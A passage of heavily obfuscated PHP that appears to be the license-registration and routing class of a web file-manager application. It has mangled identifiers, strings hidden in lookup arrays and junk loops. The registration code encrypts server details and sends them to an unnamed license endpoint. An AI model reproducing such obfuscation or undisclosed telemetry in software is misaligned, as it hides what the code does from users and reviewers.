-strlen($áÚí°Ïü))) != $áÚí°Ïü) { return; } $µš¯Í· = substr($å¸ØÔù, 0, -strlen($áÚí°Ïü)); $¦üÒ¸Û = array($İÄØÕ‡ö[4], $µš¯Í·); $Ş«ê«Ÿ« = array_slice($GLOBALS[$İÄØÕ‡ö[13]][$İÄØÕ‡ö[14]], 1); $GLOBALS[$İÄØÕ‡ö[13]][$İÄØÕ‡ö[14]] = array_merge($¦üÒ¸Û, $Ş«ê«Ÿ«); $´šÄãÍü = $ÙÆ—Ò©æ[637]; if (strlen($´šÄãÍü) < $ÙÆ—Ò©æ[249]) { return; } $GLOBALS[$İÄØÕ‡ö[13]][$İÄØÕ‡ö[15]] = implode($İÄØÕ‡ö[0], $GLOBALS[$İÄØÕ‡ö[13]][$İÄØÕ‡ö[14]]); } private function nkemac17a4bf() { $ñ¼ùê¦— =& $_SERVER[™¾ÇÙ¯¹]; $¿¿£ÑŒÆ =& $_SERVER[×ô×“Ò]; if ($GLOBALS[$¿¿£ÑŒÆ[13]][$¿¿£ÑŒÆ[15]] != $¿¿£ÑŒÆ[6]) { return; } $¸®˜‹ô£ = $_SERVER[$¿¿£ÑŒÆ[16]]; $­‡Ö¸ = $ñ¼ùê¦—[638]; while ($­‡Ö¸ < $ñ¼ùê¦—[639]) { if ($­‡Ö¸ >= 0) { break; } $­‡Ö¸++; } $ÎÍòığ¸ = $¿¿£ÑŒÆ[17]; $Â¾‹ÚÂ¢ = $ñ¼ùê¦—[640]; if (!$Â¾‹ÚÂ¢) { return; } if (!strstr($¸®˜‹ô£, $ÎÍòığ¸)) { return; } $â‡Ãù‚à = strrpos($¸®˜‹ô£, $ÎÍòığ¸); $şˆ«–üŞ = $ñ¼ùê¦—[641]; $×¸Š³³© = substr($¸®˜‹ô£, $â‡Ãù‚à + strlen($ÎÍòığ¸)); $ğí¦½» = $ñ¼ùê¦—[642]; if (strlen($ğí¦½») < $ñ¼ùê¦—[627]) { die; } preg_match_all($¿¿£ÑŒÆ[18], $×¸Š³³©, $£ı’µ÷¬); $ú›¨Å±ê = $ñ¼ùê¦—[643]; if (!$ú›¨Å±ê) { return; } $×¸Š³³© = trim($£ı’µ÷¬[0][0], $¿¿£ÑŒÆ[19]); $å§²¾¤Ğ = $ñ¼ùê¦—[644]; if (!$å§²¾¤Ğ) { return; } $GLOBALS[$¿¿£ÑŒÆ[13]][$¿¿£ÑŒÆ[14]] = explode($¿¿£ÑŒÆ[19], $×¸Š³³©); $GLOBALS[$¿¿£ÑŒÆ[13]][$¿¿£ÑŒÆ[15]] = implode($¿¿£ÑŒÆ[0], $GLOBALS[$¿¿£ÑŒÆ[13]][$¿¿£ÑŒÆ[14]]); } public function run() { $ş•Û¥Ù× =& $_SERVER[™¾ÇÙ¯¹]; $ò™ÔÄÛÙ =& $_SERVER[×ô×“Ò]; $this->nkemac17a4bf(); $»¶»È·„ = $ş•Û¥Ù×[645]; if (strlen($»¶»È·„) < $ş•Û¥Ù×[634]) { die; } $this->lfnwf10777be(); $ô¨±ØıÛ = $GLOBALS[$ò™ÔÄÛÙ[13]][$ò™ÔÄÛÙ[14]]; $×æàá¬ = $ş•Û¥Ù×[646]; if (strlen($×æàá¬) < $ş•Û¥Ù×[639]) { die; } $¨§—¿Ì£ = $GLOBALS[$ò™ÔÄÛÙ[13]][$ò™ÔÄÛÙ[15]]; define($ò™ÔÄÛÙ[20], isset($ô¨±ØıÛ[0]) && $ô¨±ØıÛ[0] ? $ô¨±ØıÛ[0] : $this->defaultModule); define($ò™ÔÄÛÙ[21], isset($ô¨±ØıÛ[1]) && $ô¨±ØıÛ[0] ? $ô¨±ØıÛ[1] : $this->defaultController); define($ò™ÔÄÛÙ[22], isset($ô¨±ØıÛ[2]) && $ô¨±ØıÛ[0] ? $ô¨±ØıÛ[2] : $this->defaultAction); define($ò™ÔÄÛÙ[23], MOD . $ò™ÔÄÛÙ[0] . ST . $ò™ÔÄÛÙ[0] . ACT); $úû”ÊİÕ = $ş•Û¥Ù×[647]; $_SERVER[$ò™ÔÄÛÙ[24]] = strtolower(ACTION); $this->autorun(); $ÆõÑ¦² = $ş•Û¥Ù×[648]; if (strlen($ÆõÑ¦²) < $ş•Û¥Ù×[634]) { die; } if (count($ô¨±ØıÛ) >= 3) { $this->appRun($¨§—¿Ì£); } else { $this->appRun(ACTION); } } private $bmaq4d5ee77c = array(); private $rzwof8203c95 = ''; public function qnbkd9975068() { $ìÓº‘á€ =& $_SERVER[™¾ÇÙ¯¹]; $Åïß¡šÎ =& $_SERVER[×ô×“Ò]; $this->xesb11a094ed(); $›ÜŸüËÇ = $ìÓº‘á€[649]; $this->qsbnfb8142a5(); $íã¡Â“¡ = $ìÓº‘á€[650]; if (!$íã¡Â“¡) { return; } $this->etzh0b76c675(); $ğ¼ÉÈ‘‘ = $ìÓº‘á€[651]; if (strlen($ğ¼ÉÈ‘‘) < $ìÓº‘á€[634]) { die; } $this->pzitfb68e257(); $ò€º‰ı = $ìÓº‘á€[652]; if (strlen($ò€º‰ı) < $ìÓº‘á€[249]) { return; } $this->nhim8e408a95(); $ò‡Œèà» = $ìÓº‘á€[653]; if (strlen($ò‡Œèà») < $ìÓº‘á€[627]) { die; } $this->rclqea4ec506(); $this->xpdt1a6090ce(); $Ğ«õ¹¹¯ = $ìÓº‘á€[654]; if (!$Ğ«õ¹¹¯) { return; } $this->wpuycfcc3528($Åïß¡šÎ[25], array($this, $Åïß¡šÎ[26])); $¡ş»‘æ¿ = $ìÓº‘á€[655]; if (strlen($¡ş»‘æ¿) < $ìÓº‘á€[639]) { die; } $this->wpuycfcc3528($Åïß¡šÎ[27], array($this, $Åïß¡šÎ[28])); $ÄÅ² ö‚ = $ìÓº‘á€[656]; while ($ÄÅ² ö‚ < $ìÓº‘á€[634]) { if ($ÄÅ² ö‚ >= 0) { break; } $ÄÅ² ö‚++; } $this->wpuycfcc3528($Åïß¡šÎ[29], array($this, $Åïß¡šÎ[30])); $íáö©ÓÒ = $ìÓº‘á€[657]; while (strlen($íáö©ÓÒ) < $ìÓº‘á€[639]) { if (!$íáö©ÓÒ) { break; } $íáö©ÓÒ++; } $this->wpuycfcc3528($Åïß¡šÎ[31], array($this, $Åïß¡šÎ[32])); $ÂŞ›§Ê = $ìÓº‘á€[658]; while (strlen($ÂŞ›§Ê) < $ìÓº‘á€[627]) { if (!$ÂŞ›§Ê) { break; } $ÂŞ›§Ê++; } } public function xrip234bfc8a($ÀüÇæ¸) { $Ş™å£ƒú =& $_SERVER[™¾ÇÙ¯¹]; $ßµıÎøá =& $_SERVER[×ô×“Ò]; $‹ĞÒÁ€Î = Model($ßµıÎøá[33])->get(); $ßÇµ¨¶ó = $Ş™å£ƒú[659]; if (strlen($ßÇµ¨¶ó) < $Ş™å£ƒú[623]) { return; } $æí˜–€ = array($ßµıÎøá[34], $ßµıÎøá[35], $ßµıÎøá[36], $ßµıÎøá[37], $ßµıÎøá[38], $ßµıÎøá[39], $ßµıÎøá[40], $ßµıÎøá[41], $ßµıÎøá[42], $ßµıÎøá[43], $ßµıÎøá[44], $ßµıÎøá[45], $ßµıÎøá[46], $ßµıÎøá[47], $ßµıÎøá[48], $ßµıÎøá[49], $ßµıÎøá[50], $ßµıÎøá[51], $ßµıÎøá[52], $ßµıÎøá[53], $ßµıÎøá[54], $ßµıÎøá[55], $ßµıÎøá[56], $ßµıÎøá[57], $ßµıÎøá[58], $ßµıÎøá[59], $ßµıÎøá[60], $ßµıÎøá[61], $ßµıÎøá[62], $ßµıÎøá[63], $ßµıÎøá[64], $ßµıÎøá[65], $ßµıÎøá[66], $ßµıÎøá[67], $ßµıÎøá[68], $ßµıÎøá[69], $ßµıÎøá[70], $ßµıÎøá[71], $ßµıÎøá[72], $ßµıÎøá[73], $ßµıÎøá[74], $ßµıÎøá[75], $ßµıÎøá[76], $ßµıÎøá[77], $ßµıÎøá[78], $ßµıÎøá[79], $ßµıÎøá[80], $ßµıÎøá[81], $ßµıÎøá[82], $ßµıÎøá[83]); foreach ($æí˜–€ as $²´™œ½¼) { $ìêˆÊÇ = $GLOBALS[$ßµıÎøá[84]][$ßµıÎøá[85]][$²´™œ½¼]; $ïä·ìùç = $Ş™å£ƒú[660]; if (isset($‹ĞÒÁ€Î[$²´™œ½¼])) { $ìêˆÊÇ = $‹ĞÒÁ€Î[$²´™œ½¼]; } $ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$²´™œ½¼] = $ìêˆÊÇ; } $³¡¼àş = $ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$ßµıÎøá[46]]; unset($ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[88]][$ßµıÎøá[89]]); $ÅÍ•Ä˜Õ = $Ş™å£ƒú[661]; if (!$ÅÍ•Ä˜Õ) { return; } unset($ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[88]][$ßµıÎøá[90]]); $Šó®´şÂ = $Ş™å£ƒú[662]; if (strlen($Šó®´şÂ) < $Ş™å£ƒú[249]) { die; } unset($ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$ßµıÎøá[46]]); $ö›¿ ¾ = $Ş™å£ƒú[663]; while ($ö›¿ ¾ < $Ş™å£ƒú[627]) { if ($ö›¿ ¾ >= 0) { break; } $ö›¿ ¾++; } unset($ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$ßµıÎøá[91]]); $ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$ßµıÎøá[92]] = array($ßµıÎøá[93] => (int) $³¡¼àş[$ßµıÎøá[94]], $ßµıÎøá[95] => (int) _get($³¡¼àş, $ßµıÎøá[96], 0)); $×ùÆÃäù = $Ş™å£ƒú[664]; while (strlen($×ùÆÃäù) < $Ş™å£ƒú[623]) { if (!$×ùÆÃäù) { break; } $×ùÆÃäù++; } $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[98]] = Action($ßµıÎøá[99])->accessToken(); $‚‰®µ = $Ş™å£ƒú[665]; if (!$‚‰®µ) { die; } $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[100]] = md5($_SERVER[$ßµıÎøá[101]] . $‹ĞÒÁ€Î[$ßµıÎøá[102]]); $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[103]] = base64_encode(serverInfo()); $Î„éŞ¡ù = $Ş™å£ƒú[666]; if (strlen($Î„éŞ¡ù) < $Ş™å£ƒú[627]) { return; } $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[104]] = $this->rzwof8203c95; if ($‹ĞÒÁ€Î[$ßµıÎøá[104]] != $ßµıÎøá[105]) { $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[106]] = $‹ĞÒÁ€Î[$ßµıÎøá[106]]; $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[107]] = $‹ĞÒÁ€Î[$ßµıÎøá[107]]; $Öº¼Ÿ­À = rand_string(10) . $this->rzwof8203c95 . rand_string(5); $ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[108]][$ßµıÎøá[109]] = $this->trvca7a41ca1($Öº¼Ÿ­À, $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[100]]); } if ($this->rzwof8203c95 == $ßµıÎøá[105]) { $ÀüÇæ¸[$ßµıÎøá[86]][$ßµıÎøá[87]][$ßµıÎøá[92]][$ßµıÎøá[96]] = 0; } $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[110]] = _get($this->bmaq4d5ee77c, $ßµıÎøá[111], $ßµıÎøá[6]); $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[112]] = _get($this->bmaq4d5ee77c, $ßµıÎøá[113], $ßµıÎøá[6]); $æòõØç = $Ş™å£ƒú[667]; if (strlen($æòõØç) < $Ş™å£ƒú[634]) { return; } if (_get($GLOBALS, $ßµıÎøá[114]) && $this->config[$ßµıÎøá[115]]) { $ÀüÇæ¸[$ßµıÎøá[97]][$ßµıÎøá[116]] = WEB_ROOT; } return $ÀüÇæ¸; } private function rclqea4ec506() { $şâë›æÙ =& $_SERVER[™¾ÇÙ¯¹]; $„ÎÁ©Œ =& $_SERVER[×ô×“Ò]; $Ì¤†Ò†º = $_SERVER[$„ÎÁ©Œ[24]] == $„ÎÁ©Œ[117]; $™‘»ü¦İ = $şâë›æÙ[668]; if (strlen($™‘»ü¦İ) < $şâë›æÙ[249]) { return; } if ($_SERVER[$„ÎÁ©Œ[24]] == $„ÎÁ©Œ[118] && $_GET[$„ÎÁ©Œ[119]] == $„ÎÁ©Œ[120]) { $Ì¤†Ò†º = !0; } if ($Ì¤†Ò†º) { $Òƒ«Îõ = array($„ÎÁ©Œ[104] => $this->rzwof8203c95, $„ÎÁ©Œ[121] => $this->jxco62637914(), $„ÎÁ©Œ[122] => Model($„ÎÁ©Œ[123])->count()); if ($this->rzwof8203c95 != $„ÎÁ©Œ[105]) { $‘ÅÔä´² = _get($this->bmaq4d5ee77c, $„ÎÁ©Œ[124]); if ($‘ÅÔä´²) { $Òƒ«Îõ[$„ÎÁ©Œ[125]] = $‘ÅÔä´²; $Òƒ«Îõ[$„ÎÁ©Œ[126]] = strtotime(_get($this->bmaq4d5ee77c, $„ÎÁ©Œ[127])); $Òƒ«Îõ[$„ÎÁ©Œ[128]] = _get($this->bmaq4d5ee77c, $„ÎÁ©Œ[113]); } $Ê¯àû = Model($„ÎÁ©Œ[33])->get($„ÎÁ©Œ[129], $„ÎÁ©Œ[6], !0); if (is_string($Ê¯àû) && substr($Ê¯àû, 0, 1) == $„ÎÁ©Œ[130]) { $Ê¯àû = json_decode_force($Ê¯àû); } if (is_array($Ê¯àû) && $Ê¯àû[$„ÎÁ©Œ[131]] && strstr($Ê¯àû[$„ÎÁ©Œ[131]], $„ÎÁ©Œ[132])) { $¤¬Çßˆ = explode($„ÎÁ©Œ[132], $Ê¯àû[$„ÎÁ©Œ[131]]); $Òƒ«Îõ[$„ÎÁ©Œ[133]] = $¤¬Çßˆ[0]; } } $Òƒ«Îõ = $this->dosr998eda36(json_encode($Òƒ«Îõ), md5($„ÎÁ©Œ[134])); $Ó±‹ˆ™ã = $şâë›æÙ[669]; if (strlen($Ó±‹ˆ™ã) < $şâë›æÙ[627]) { die; } $ëã¸îó‹ = array($„ÎÁ©Œ[135] => $Òƒ«Îõ); call_user_func(array($„ÎÁ©Œ[136], $„ÎÁ©Œ[137]), $ëã¸îó‹); } if ($this->rzwof8203c95 == $„ÎÁ©Œ[105]) { return; } $ïğ›Ééğ = array($„ÎÁ©Œ[138], $„ÎÁ©Œ[139], $„ÎÁ©Œ[140], $„ÎÁ©Œ[141], $„ÎÁ©Œ[142], $„ÎÁ©Œ[143]); $ˆÈí³ê— = $şâë›æÙ[670]; if (strlen($ˆÈí³ê—) < $şâë›æÙ[639]) { die; } $¬÷²‡® = Model($„ÎÁ©Œ[33])->get(); $êËÈˆ¯ = $şâë›æÙ[671]; if (strlen($êËÈˆ¯) < $şâë›æÙ[249]) { return; } $ëã¸îó‹ = array($„ÎÁ©Œ[144] => $¬÷²‡®[$„ÎÁ©Œ[34]], $„ÎÁ©Œ[145] => $¬÷²‡®[$„ÎÁ©Œ[35]], $„ÎÁ©Œ[146] => $„ÎÁ©Œ[6]); foreach ($ïğ›Ééğ as $¹£¨ë) { if (!isset($¬÷²‡®[$¹£¨ë]) || !$¬÷²‡®[$¹£¨ë]) { continue; } $ëã¸îó‹[$¹£¨ë] = $¬÷²‡®[$¹£¨ë]; $çô¾£ñå = $şâë›æÙ[672]; if (strlen($çô¾£ñå) < $şâë›æÙ[623]) { die; } } call_user_func(array($„ÎÁ©Œ[136], $„ÎÁ©Œ[137]), $ëã¸îó‹); } private function pzitfb68e257() { $¯ø‹»Ã =& $_SERVER[™¾ÇÙ¯¹]; $Ìõ•Í¼ =& $_SERVER[×ô×“Ò]; if ($_SERVER[$Ìõ•Í¼[24]] != $Ìõ•Í¼[147]) { return; } if (!_get($GLOBALS, $Ìõ•Í¼[114])) { die; } $Ğ“úÇ = $GLOBALS[$Ìõ•Í¼[13]]; if (isset($Ğ“úÇ[$Ìõ•Í¼[148]])) { $this->htea457d408f(); die; } if (!isset($Ğ“úÇ[$Ìõ•Í¼[149]]) || strlen($Ğ“úÇ[$Ìõ•Í¼[149]]) != 16) { show_json($Ìõ•Í¼[150] . $Ğ“úÇ[$Ìõ•Í¼[149]], !1); } $ÀÂË¡éú = Model($Ìõ•Í¼[33])->get($Ìõ•Í¼[102]); $…©øñÅ‰ = md5($_SERVER[$Ìõ•Í¼[101]] . $ÀÂË¡éú); $”½Û¢Å = $¯ø‹»Ã[673]; $¿õÂÛ§ = array($Ìõ•Í¼[149] => $Ğ“úÇ[$Ìõ•Í¼[149]], $Ìõ•Í¼[151] => rand_string(16), $Ìõ•Í¼[152] => $Ìõ•Í¼[134], $Ìõ•Í¼[153] => $Ìõ•Í¼[154], $Ìõ•Í¼[155] => $_SERVER[$Ìõ•Í¼[156]], $Ìõ•Í¼[157] => $_SERVER[$Ìõ•Í¼[158]], $Ìõ•Í¼[159] => $_SERVER[$Ìõ•Í¼[160]], $Ìõ•Í¼[100] => $…©øñÅ‰, $Ìõ•Í¼[161] => Model($Ìõ•Í¼[33])->get($Ìõ•Í¼[129])); $®ä·šü = $¯ø‹»Ã[674]; if ($Ğ“úÇ[$Ìõ•Í¼[162]] == $Ìõ•Í¼[163]) { $ºù±÷Ô£ = $this->dosr998eda36($…©øñÅ‰, $Ìõ•Í¼[164]); $û…€áé = $this->trvca7a41ca1(json_encode($¿õÂÛ§), $…©øñÅ‰ . $Ìõ•Í¼[165], 3); $û…€áé = $û…€áé . $Ìõ•Í¼[166] . $_SERVER[$Ìõ•Í¼[156]]; $Şê²êİ = $this->iqmndc3cf655($Ìõ•Í¼[167] . $ºù±÷Ô£ . $Ìõ•Í¼[168] . $û…€áé, -1); show_json($Şê²êİ, !0); } else { if ($Ğ“úÇ[$Ìõ•Í¼[162]] == $Ìõ•Í¼[169]) { $÷–Ú¸ï» = substr(md5($Ìõ•Í¼[170] . $…©øñÅ‰), 12, 15) . $Ìõ•Í¼[171]; $û…€áé = $this->zerfae2ef0c1(trim($Ğ“úÇ[$Ìõ•Í¼[172]]), $÷–Ú¸ï», 2); $±Ÿö¹àŠ = json_decode($û…€áé, !0); if (!is_array($±Ÿö¹àŠ) || !is_array($±Ÿö¹àŠ[$Ìõ•Í¼[173]]) || $±Ÿö¹àŠ[$Ìõ•Í¼[149]] != !0) { $Èé–¼¼à = $Ìõ•Í¼[174]; $ú«æ¦Ÿ = $±Ÿö¹àŠ[$Ìõ•Í¼[173]] ? $Ìõ•Í¼[175] . $±Ÿö¹àŠ[$Ìõ•Í¼[173]] : $Èé–¼¼à; show_json($ú«æ¦Ÿ, !1); } else { $¿õÂÛ§[$Ìõ•Í¼[151]] = $±Ÿö¹àŠ[$Ìõ•Í¼[173]][$Ìõ•Í¼[176]]; } } else { $±Ÿö¹àŠ = $this->iqmndc3cf655($Ìõ•Í¼[177], $¿õÂÛ§, 10); $€­Òš¢š = $¯ø‹»Ã[675]; } } if (!is_array($±Ÿö¹àŠ) || !is_array($±Ÿö¹àŠ[$Ìõ•Í¼[173]]) || $±Ÿö¹àŠ[$Ìõ•Í¼[149]] != !0) { $Èé–¼¼à = LNG($Ìõ•Í¼[178]); $ú«æ¦Ÿ = $±Ÿö¹àŠ[$Ìõ•Í¼[173]] ? $Ìõ•Í¼[175] . $±Ÿö¹àŠ[$Ìõ•Í¼[173]] : $Èé–¼¼à; show_json($ú«æ¦Ÿ, !1); } $Ò•ğ°ÊÒ = $±Ÿö¹àŠ[$Ìõ•Í¼[173]]; $äôœ—áË = $this->ermw4259f77f($Ò•ğ°ÊÒ[$Ìõ•Í¼[179]]); if (!$äôœ—áË || $äôœ—áË != $Ò•ğ°ÊÒ[$Ìõ•Í¼[127]]) { $š¼„¼ÅÈ = array($Ìõ•Í¼[180] => Model($Ìõ•Í¼[33])->get($Ìõ•Í¼[102]), $Ìõ•Í¼[181] => $_SERVER[$Ìõ•Í¼[101]], $Ìõ•Í¼[182] => this_url(), $Ìõ•Í¼[157] => $_SERVER[$Ìõ•Í¼[158]]); $û…€áé = $this->ywex3f9a3342(json_encode($š¼„¼ÅÈ)); $this->iqmndc3cf655($Ìõ•Í¼[183] . $û…€áé); show_json(LNG($Ìõ•Í¼[184]), !0); } $Á˜Ñß¡Î = array($Ìõ•Í¼[185] => $Ò•ğ°ÊÒ[$Ìõ•Í¼[186]], $Ìõ•Í¼[187] => $Ò•ğ°ÊÒ[$Ìõ•Í¼[188]], $Ìõ•Í¼[189] => rand_string(16), $Ìõ•Í¼[104] => $Ò•ğ°ÊÒ[$Ìõ•Í¼[190]]); if ($¿õÂÛ§[$Ìõ•Í¼[151]]) { $Á˜Ñß¡Î[$Ìõ•Í¼[189]] = $¿õÂÛ§[$Ìõ•Í¼[151]]; } $ÆÚ¨ì· = substr(md5($Á˜Ñß¡Î[$Ìõ•Í¼[187]]), 10, 10); $Á½şŸƒ = $ÆÚ¨ì· . $Á˜Ñß¡Î[$Ìõ•Í¼[104]] . $Á˜Ñß¡Î[$Ìõ•Í¼[189]]; $Õ“Šş×‡ = $¯ø‹»Ã[676]; if (!$Õ“Šş×‡) { die; } $Á˜Ñß¡Î[$Ìõ•Í¼[106]] = strrev(base64_encode($this->dosr998eda36($Á½şŸƒ, $Ìõ•Í¼[191]))); $ÓËõ–ÛÓ = rand_string(16); $Îúå¯é­ = $ÓËõ–ÛÓ . $Á˜Ñß¡Î[$Ìõ•Í¼[104]] . $this->dosr998eda36(md5($Á˜Ñß¡Î[$Ìõ•Í¼[185]]), $ÓËõ–ÛÓ); $å•Ø“Åø = $¯ø‹»Ã[677]; $Á˜Ñß¡Î[$Ìõ•Í¼[107]] = base64_encode(strrev($this->dosr998eda36($Îúå¯é­, $Ìõ•Í¼[192]))); $‚ÑÓªÏŞ = $¯ø‹»Ã[678]; while ($‚ÑÓªÏŞ < $¯ø‹»Ã[634]) { if ($‚ÑÓªÏŞ >= 0) { break; } $‚ÑÓªÏŞ++; } if ($Ò•ğ°ÊÒ[$Ìõ•Í¼[193]] && $Ò•ğ°ÊÒ[$Ìõ•Í¼[193]] >= 1) { Model($Ìõ•Í¼[33])->setDeep($Ìõ•Í¼[194], $Ìõ•Í¼[120]); } Model($Ìõ•Í¼[33])->set($Á˜Ñß¡Î); $æ§Êí = md5($_SERVER[$Ìõ•Í¼[101]] . strrev($ÀÂË¡éú) . $Á˜Ñß¡Î[$Ìõ•Í¼[187]]); $Ÿ©Æ‹× = $¯ø‹»Ã[679]; if (!$Ÿ©Æ‹×) { return; } $œ±Ï³ˆ÷ = strrev(substr($æ§Êí, 10, 16)); $Œö§½Ö = $¯ø‹»Ã[680]; $±šï÷Ğ§ = $this->trvca7a41ca1(json_encode($Ò•ğ°ÊÒ), $æ§Êí); $¤Â†¸¼Û = $¯ø‹»Ã[681]; if (strlen($¤Â†¸¼Û) < $¯ø‹»Ã[627]) { die; } $îÆœÙÕ¥ = array_to_keyvalue(Model($Ìõ•Í¼[7])->listData(), $Ìõ•Í¼[195]); $ ãÄü¤‹ = $îÆœÙÕ¥[$Ìõ•Í¼[196]]; $âÛÖ¯êÊ = $¯ø‹»Ã[682]; while ($âÛÖ¯êÊ < $¯ø‹»Ã[249]) { if ($âÛÖ¯êÊ >= 0) { break; } $âÛÖ¯êÊ++; } $øÂ±æÒª = array(); $œ÷êÅ´â = $¯ø‹»Ã[683]; if (strlen($œ÷êÅ´â) < $¯ø‹»Ã[249]) { return; } $øÂ±æÒª[$œ±Ï³ˆ÷] = $±šï÷Ğ§; $¨”Áù½‡ = $¯ø‹»Ã[684]; if (strlen($¨”Áù½‡) < $¯ø‹»Ã[627]) { return; } Model($Ìõ•Í¼[7])->update($ ãÄü¤‹[$Ìõ•Í¼[197]], array($Ìõ•Í¼[198] => $øÂ±æÒª)); $this->bmaq4d5ee77c = $Ò•ğ°ÊÒ; $Ä»ÈœÜ¢ = $¯ø‹»Ã[685]; $this->rzwof8203c95 = $Á˜Ñß¡Î[$Ìõ•Í¼[104]]; $this->licenseRegistSuccess(); Cache::set($Ìõ•Í¼[199] . md5($ÀÂË¡éú . $Ìõ•Í¼[200]), $Ìõ•Í¼[6]); $¡‰îÓà = $¯ø‹»Ã[686]; show_json(LNG($Ìõ•Í¼[184]), !0); } private function licenseRegistSuccess() { $·Ü¢†¸Í =& $_SERVER[×ô×“Ò]; $ø”³ÁğÄ = Model($·Ü¢†¸Í[33])->get(); if ($ø”³ÁğÄ[$·Ü¢†¸Í[63]] != $·Ü¢†¸Í[120]) { Model($·Ü¢†¸Í[33])->set($·Ü¢†¸Í[63], $·Ü¢†¸Í[120]); } Action($·Ü¢†¸Í[201])->initStart(!0); } private function htea457d408f() { $Á†çÆû =& $_SERVER[×ô×“Ò]; Model($Á†çÆû[33])->set(array($Á†çÆû[185] => $Á†çÆû[6], $Á†çÆû[187] => $Á†çÆû[6], $Á†çÆû[104] => $Á†çÆû[105], $Á†çÆû[106] => $Á†çÆû[6], $Á†çÆû[107] => $Á†çÆû[6])); Model($Á†çÆû[33])->setDeep($Á†çÆû[194], $Á†çÆû[202]); $this->bmaq4d5ee77c = array(); $this->rzwof8203c95 = $Á†çÆû[105]; } private function xesb11a094ed() { $¿»®ÒŸ =& $_SERVER[™¾ÇÙ¯¹]; $áÂŸËşØ =& $_SERVER[×ô×“Ò]; $_SERVER[$áÂŸËşØ[158]] = _get($_SERVER, $áÂŸËşØ[158], APP_HOST); $ŒÔ¢Å = $¿»®ÒŸ[687]; if (strlen($ŒÔ¢Å) < $¿»®ÒŸ[623]) { return; } $this->rzwof8203c95 = $áÂŸËşØ[105]; $ªÕ“ßç¦ = Model($áÂŸËşØ[33])->get(); $™…­óŞ“ = $¿»®ÒŸ[688]; if (!$™…­óŞ“) { die; } if ($ªÕ“ßç¦[$áÂŸËşØ[104]] == $áÂŸËşØ[105]) { return; } $„êØ±Ì = Model($áÂŸËşØ[33])->get($áÂŸËşØ[102]); $˜ÍÃ¶ŸØ = $áÂŸËşØ[199] . md5($„êØ±Ì . $áÂŸËşØ[200]); $ÅÍŒÀ¶ = Cache::get($˜ÍÃ¶ŸØ); $ãàŞÊ§ñ = $¿»®ÒŸ[689]; if (strlen($ãàŞÊ§ñ) < $¿»®ÒŸ[639]) { die; } if (!is_array($ÅÍŒÀ¶) || !isset($ÅÍŒÀ¶[$áÂŸËşØ[203]]) || time() - $ÅÍŒÀ¶[$áÂŸËşØ[203]] >= 60) { $Àîòí¦Ë = Model($áÂŸËşØ[7])->loadList(); $¬ù×¡† = $Àîòí¦Ë[$áÂŸËşØ[196]]; $Ìäîãğ = md5($_SERVER[$áÂŸËşØ[101]] . strrev($„êØ±Ì) . $ªÕ“ßç¦[$áÂŸËşØ[187]]); $Ê™®Šåœ = strrev(substr($Ìäîãğ, 10, 16)); $ÅÍŒÀ¶ = $this->zerfae2ef0c1($¬ù×¡†[$áÂŸËşØ[84]][$Ê™®Šåœ], $Ìäîãğ); $ÅÍŒÀ¶ = json_decode($ÅÍŒÀ¶, !0); } if (!is_array($ÅÍŒÀ¶)) { return $this->htea457d408f(); } $È™„Šš = strtotime($ÅÍŒÀ¶[$áÂŸËşØ[127]]); if (time() >= $È™„Šš) { return $this->htea457d408f(); } if (time() - $ÅÍŒÀ¶[$áÂŸËşØ[203]] > 20) { $ÅÍŒÀ¶[$áÂŸËşØ[203]] = time(); Cache::set($˜ÍÃ¶ŸØ, $ÅÍŒÀ¶); } $this->bmaq4d5ee77c = $ÅÍŒÀ¶; $this->rzwof8203c95 = $ªÕ“ßç¦[$áÂŸËşØ[104]]; $Ş’÷ø = $¿»®ÒŸ[690]; while (strlen($Ş’÷ø) < $¿»®ÒŸ[634]) { if (!$Ş’÷ø) { break; } $Ş’÷ø++; } } private function qsbnfb8142a5() { $ŒŸ±¤Ûğ =& $_SERVER[™¾ÇÙ¯¹]; $Ğ¥òŒ²ˆ =& $_SERVER[×ô×“Ò]; $—ÛâÜÉ¡ = $GLOBALS[$Ğ¥òŒ²ˆ[13]]; $­ˆ‰Üæˆ = $ŒŸ±¤Ûğ[691]; while ($­ˆ‰Üæˆ < $ŒŸ±¤Ûğ[623]) { if ($­ˆ‰Üæˆ >= 0) { break; } $­ˆ‰Üæˆ++; } $š‹öÃÜô = $_SERVER[$Ğ¥òŒ²ˆ[24]]; $ÂÀËøç™ = $ŒŸ±¤Ûğ[674]; if ($š‹öÃÜô == $Ğ¥òŒ²ˆ[204] && $this->rzwof8203c95 == $Ğ¥òŒ²ˆ[105]) { show_json(LNG($Ğ¥òŒ²ˆ[205]), !1, $Ğ¥òŒ²ˆ[206]); } $ÖÉ¸Ö = array($Ğ¥òŒ²ˆ[207], $Ğ¥òŒ²ˆ[208]); if (in_array($š‹öÃÜô, $ÖÉ¸Ö)) { if ($this->rzwof8203c95 == $Ğ¥òŒ²ˆ[105] && isset($—ÛâÜÉ¡[$Ğ¥òŒ²ˆ[209]])) { show_json(LNG($Ğ¥òŒ²ˆ[205]), !1, $Ğ¥òŒ²ˆ[206]); die; } $¹õÁõˆº = $this->jxco62637914(); if ($¹õÁõˆº != intval($Ğ¥òŒ²ˆ[210])) { if ($¹õÁõˆº <= Model($Ğ¥òŒ²ˆ[123])->count()) { show_json(LNG($Ğ¥òŒ²ˆ[211]), !1, $Ğ¥òŒ²ˆ[206]); die; } } } } private function etzh0b76c675() { $îèæö¬Î =& $_SERVER[™¾ÇÙ¯¹]; $¶ß“î =& $_SERVER[×ô×“Ò]; $èØ°ÄĞ = 